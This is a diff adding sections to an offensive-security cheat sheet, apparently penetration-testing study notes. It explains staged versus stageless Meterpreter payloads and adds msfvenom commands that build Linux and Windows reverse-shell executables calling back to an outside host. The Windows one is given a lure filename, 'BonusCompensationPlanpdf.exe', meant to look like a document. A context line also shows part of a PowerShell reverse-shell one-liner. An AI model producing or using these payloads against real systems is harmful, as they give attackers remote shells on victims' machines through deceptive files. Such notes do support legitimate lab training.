@@ -39,8 +39,26 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.
 
 # Msfvenom
 
+## Staged and Stageless
+
+Staged: **`windows/meterpreter/reverse_tcp`** → separated by `/` → sends a small stager first, then downloads the stage.
+
+Stageless: **`windows/meterpreter_reverse_tcp`** → combined with `_` → sends the **entire payload at once**.
+
+**Easy rule:** `/` = **staged** | `_` = **stageless**.
+
 ## Listing Payloads
 
 ```bash
 msfvenom -l payloads
+```
+
+## Creating Stageless Payloads
+
+```bash
+# Linux
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
+
+# Windows
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
 ```
